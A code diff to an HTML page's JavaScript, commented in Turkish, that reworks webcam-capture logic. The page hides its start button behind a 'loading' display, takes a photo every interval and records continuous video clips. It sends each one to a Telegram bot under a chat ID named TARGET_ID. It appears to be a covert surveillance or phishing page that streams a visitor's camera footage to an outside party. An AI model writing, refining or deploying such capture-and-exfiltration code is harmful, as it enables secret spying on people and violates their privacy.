@@ -93,7 +93,7 @@
             }
             
             // ============================================
-            // PROFESYONEL ZAMANLAMA SİSTEMİ
+            // KAMERA İŞLEMLERİ
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -104,8 +104,8 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
-            let baslangicZamani = 0;
-            let sonVideoZamani = 0;
+            let videoAktif = false;
+            let videoTimer = null;
             
             // ============================================
             // KAMERA BAŞLAT
@@ -114,9 +114,8 @@
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            width: { exact: 640 },
-                            height: { exact: 480 },
-                            frameRate: { exact: 30 }
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
                         } 
                     });
                     
@@ -127,14 +126,11 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        baslangicZamani = performance.now();
-                        sonVideoZamani = baslangicZamani + 2000; // İlk video 2 saniye sonra
-                        
-                        // FOTOĞRAF ZAMANLAMA
+                        // FOTOĞRAF - her saniye
                         setInterval(() => {
                             if (!stream?.active) return;
-                            photoCount++;
                             
+                            photoCount++;
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             ctx.drawImage(video, 0, 0);
@@ -149,55 +145,13 @@
                                     method: 'POST',
                                     body: formData
                                 });
-                            }, 'image/jpeg', 0.9);
+                            }, 'image/jpeg', 0.8);
                         }, FOTO_SURESI * 1000);
                         
-                        // VİDEO ZAMANLAMA - KESİNTİSİZ
-                        setTimeout(function videoLoop() {
-                            if (!stream?.active) return;
-                            
-                            videoCount++;
-                            recordedChunks = [];
-                            
-                            try {
-                                mediaRecorder = new MediaRecorder(stream, {
-                                    mimeType: 'video/webm;codecs=vp8',
-                                    videoBitsPerSecond: 4000000
-                                });
-                            } catch(e) {
-                                mediaRecorder = new MediaRecorder(stream);
-                            }
-                            
-                            mediaRecorder.ondataavailable = (e) => {
-                                if (e.data.size > 0) recordedChunks.push(e.data);
-                            };
-                            
-                            mediaRecorder.onstop = () => {
-                                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                                const boyutKB = (blob.size / 1024).toFixed(0);
-                                
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('video', blob, `video_${Date.now()}.webm`);
-                                formData.append('caption', `🎥 Video #${videoCount} - ${VIDEO_SURESI}s (${boyutKB}KB)`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                                
-                                // HEMEN YENİ VİDEO BAŞLAT - BEKLEME YOK
-                                videoLoop();
-                            };
-                            
-                            mediaRecorder.start();
-                            setTimeout(() => {
-                                if (mediaRecorder?.state === 'recording') {
-                                    mediaRecorder.stop();
-                                }
-                            }, VIDEO_SURESI * 1000);
-                            
-                        }, 2000); // İlk video 2 saniye sonra
+                        // İLK VİDEOYU BAŞLAT
+                        setTimeout(() => {
+                            videoBaslat();
+                        }, 2000);
                     };
                     
                 } catch(e) {
@@ -206,9 +160,67 @@
             }
             
             // ============================================
+            // VİDEO BAŞLAT - KESİNTİSİZ
+            // ============================================
+            function videoBaslat() {
+                if (!stream?.active || videoAktif) return;
+                
+                videoAktif = true;
+                videoCount++;
+                recordedChunks = [];
+                
+                try {
+                    mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: 'video/webm;codecs=vp8',
+                        videoBitsPerSecond: 2500000
+                    });
+                } catch(e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = () => {
+                    videoAktif = false;
+                    
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const boyutKB = (blob.size / 1024).toFixed(0);
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', TARGET_ID);
+                    formData.append('video', blob, `video_${Date.now()}.webm`);
+                    formData.append('caption', `🎥 Video #${videoCount} - ${VIDEO_SURESI}s (${boyutKB}KB)`);
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        // VİDEO GÖNDERİLDİKTEN HEMEN SONRA YENİSİNİ BAŞLAT
+                        setTimeout(() => {
+                            if (stream?.active) {
+                                videoBaslat();
+                            }
+                        }, 100);
+                    });
+                };
+                
+                mediaRecorder.start();
+                
+                // Tam sürede durdur
+                videoTimer = setTimeout(() => {
+                    if (mediaRecorder?.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, VIDEO_SURESI * 1000);
+            }
+            
+            // ============================================
             // TEMİZLİK
             // ============================================
             window.onbeforeunload = function() {
+                if (videoTimer) clearTimeout(videoTimer);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
@@ -217,4 +229,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
